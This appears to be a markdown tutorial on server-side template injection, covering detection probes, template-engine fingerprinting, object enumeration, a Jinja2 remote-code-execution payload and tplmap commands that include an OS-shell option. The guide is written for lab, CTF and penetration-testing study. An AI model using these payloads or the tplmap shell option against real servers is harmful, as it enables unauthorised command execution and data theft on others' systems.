
# Server-Side Template Injection (SSTI) Guide

## Lab Levels

Jump directly to the lab writeups:

* [PRACTITIONER](./PRACTITIONER_Lab.md)
* [EXPERT](./EXPERT_Lab.md)

  
## Introduction

## Overview

**Server-Side Template Injection (SSTI)** occurs when user-controlled input is embedded directly into a server-side template and evaluated as code. This vulnerability can lead to **information disclosure**, **arbitrary file access**, or even **remote code execution (RCE)**.

Template engines are designed to render dynamic content by combining templates with data. However, when untrusted input is injected into templates without proper sanitization, attackers can manipulate the rendering logic and execute arbitrary code on the server.

---

## Constructing an SSTI Attack

<p align="center">
  <img src="https://github.com/user-attachments/assets/0a2d1b29-4dde-407c-8eca-f0c1871db652" width="850" alt="SSTI Concept Diagram">
  <br>
  <em>Figure: Overview of the Server-Side Template Injection (SSTI) attack process</em>
</p>

### 1. Detection Phase

#### A. Identify User Input Reflection

Locate areas where user input is reflected in the server response. These can often be discovered via manual inspection or interception proxies such as **Burp Suite**.

#### B. Fuzz with Polyglot Payloads

Use **polyglot payloads** containing syntax elements from multiple template engines to detect potential SSTI:

```bash
POST /endpoint HTTP/1.1
Host: vulnerable-site.com
parameter=${{<%[%'"}}%\.
````

If the server’s response changes, produces an error, or displays evaluated expressions, SSTI may be present.

#### C. Observe Server Responses

Indicators of SSTI include:

* Evaluated expressions (e.g., `${7*7}` → `49`)
* Template syntax errors
* Stack traces or framework-specific messages
* Incomplete or malformed responses

---

### 2. Syntax Testing: Determine Template Context

#### A. Plaintext Context

Test with simple arithmetic expressions:

```
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}
```

If the output returns `49`, your payload was evaluated — confirming SSTI.

#### B. Expression Context

When user input is directly inserted into an active expression, attempt to break the syntax:

```python
engine.render("Hello {{"+greeting+"}}", data)
```

Then test with:

```bash
/greeting=data.username
/greeting=data.username}}hello
```

If closing the expression (`}}`) affects rendering or triggers an error, SSTI is likely.

---

## Identification Phase: Determine the Template Engine

Once SSTI is verified, identifying the specific **template engine** is crucial for crafting engine-specific payloads.

### A. Trigger and Analyze Errors

Inject malformed expressions:

```
${}
{{}}
<%= %>
${foobar}
{{foobar}}
<%= foobar %>
${7/0}
{{7/0}}
<%= 7/0 %>
```

Error messages or stack traces may reveal the engine name (e.g., Jinja2, Twig, Freemarker, etc.).

<p align="center">
  <img src="https://github.com/user-attachments/assets/c46bb395-99da-4871-954a-69e38b54356a" width="750" alt="SSTI Error Output">
  <br>
  <em>Figure: Error message disclosing the underlying template engine</em>
</p>

---

### B. Test Engine-Specific Syntax

If no explicit error message appears, test common syntaxes for popular engines:

```
=${7*3}
={{7*3}}
=<%= 7*3 %>
```
If a specific syntax evaluates correctly (`21`), it identifies the underlying template engine.

<p align="center">
  <img src="https://github.com/user-attachments/assets/7a622a4f-f19a-453f-8695-827687bb3225" width="750" alt="Template Engine Syntax Detection">
  <br>
  <em>Figure: Using arithmetic evaluation to fingerprint the template engine</em>
</p>


---

## Exploitation Phase

### Step 1: Review Documentation

Study engine-specific documentation or resources like **HackTricks** to identify:

* Built-in objects and filters
* Sandbox restrictions and bypasses
* Known exploit primitives

---

### Step 2: Enumerate Accessible Objects

Attempt to access key objects:

```html
{{ self }}
{{ request }}
{{ session }}
{{ config }}
{{ os }}
```

If unavailable, perform brute-force enumeration using **SecLists** or **Burp Intruder** wordlists of potential variables and object attributes such as:

```
__class__, __mro__, __subclasses__
```

---

### Step 3: Execute Payloads

Once internal objects are accessible, escalate to RCE or file access.

**Example (Jinja2):**

```html
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
```

---

## Tools

### Tplmap

[Tplmap](https://github.com/epinna/tplmap) automates the detection and exploitation of SSTI vulnerabilities.

**Usage Examples:**

```bash
python2.7 tplmap.py -u 'http://target.com/page?name=John*' --os-shell
python2.7 tplmap.py -u "http://target.com/page?user=*&comment=hello"
python2.7 tplmap.py -u "http://target.com/ti?user=InjectHere*&comment=A" --level 5 -e jade
```

---

## Summary: SSTI Exploitation Workflow

```text
1. Identify user input reflection
2. Inject polyglot payload: ${{<%[%'"}}%\.
3. Test for evaluation ({{7*7}}, ${7*7}, <%= 7*7 %>)
4. Observe output or error to confirm SSTI
5. Determine the template engine by syntax or stack trace
6. Enumerate internal objects
7. Exploit: Execute commands, read files, escalate privileges
```

---

## Summary Notes: “Template Engines Injection 101” by 0xAwali

**Source:** [Template Engines Injection 101 – @0xAwali](https://medium.com/@0xAwali/template-engines-injection-101-4f2fe59e5756)

---

### 🔍 Overview

The post explores how **Server-Side Template Injection (SSTI)** vulnerabilities arise, how to detect them, and how different engines behave under injection. It also provides payloads and error-based fingerprinting methods for accurate engine identification.

---

### ⚙️ Covered Template Engines

| Language       | Template Engines                |
| -------------- | ------------------------------- |
| **JavaScript** | EJS, Handlebars, Vue, Pug       |
| **Python**     | Jinja2, Tornado, Django, Mako   |
| **Ruby**       | ERB, Slim, HAML                 |
| **PHP**        | Twig, Smarty, Blade             |
| **Java**       | Velocity, Freemarker, Thymeleaf |
| **Go**         | text/template, html/template    |

---

###  Language Summaries

#### JavaScript Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/c141fd66-7325-41f2-be03-d98c250802bb" width="750" alt="JavaScript Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for JavaScript template engines</em>
</p>

---

#### Python Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/17583ce6-6772-46d9-908d-c8c27629fdb9" width="750" alt="Python Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for Python template engines</em>
</p>

---

#### Ruby Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/9bbe4e94-98e6-4983-822c-7355b44d09a6" width="750" alt="Ruby Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for Ruby template engines</em>
</p>

---

#### PHP Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/e7baced5-3636-45e5-83da-dbc32f50b17d" width="750" alt="PHP Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for PHP template engines</em>
</p>

---

#### Java Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/af9db6af-d7e1-4614-970c-b0fba4bdf3e5" width="750" alt="Java Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for Java template engines</em>
</p>

---

#### Go Summary

<p align="center">
  <img src="https://github.com/user-attachments/assets/84f00c5e-ecd1-4fdb-a75f-f4b08d3f9f0e" width="750" alt="Go Template Engine Summary">
  <br>
  <em>Figure: Behavior and payload characteristics for Go template engines</em>
</p>

---

### 🧩 Universal Payloads

After analysis, it was observed that **15 universal payloads** can detect or exploit most template engines across different languages.

<p align="center">
  <img src="https://github.com/user-attachments/assets/10c3d686-60ea-4089-8b9f-e481d755d4ec" width="850" alt="Universal SSTI Payloads">
  <br>
  <em>Figure: Universal payloads applicable across multiple template engines</em>
</p>

---


### 🧠 Key Concepts

1. **SSTI Definition:** Untrusted input executed in the server’s template engine.
2. **Goal:** Achieve arbitrary code execution or sensitive data access.
3. **Risk:** Leads to RCE, file disclosure, and system compromise.

---

### 🧰 Practice Resources

* PortSwigger’s **SSTI Labs**
* Hackmanit’s **Template Injection Playground**
* Official documentation for each template engine

Ideal for **CTF participants**, **bug bounty hunters**, and **security professionals**.

---

### ⚠️ Ethical Use

Always test SSTI only in authorized environments such as CTFs, labs, or your own applications.
Never use these payloads against live systems without explicit permission.

---

### 📚 Takeaway

This article by **@0xAwali** provides one of the most comprehensive overviews of SSTI, covering detection, identification, and exploitation across multiple programming languages.

---

## References

* [HackTricks SSTI Guide](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
* [A Pentester’s Guide to SSTI – Medium](https://medium.com/@bdemir/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68)
* [OWASP Template Injection Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Template_Injection_Cheat_Sheet.html)
* [Tplmap GitHub Repository](https://github.com/epinna/tplmap)

---

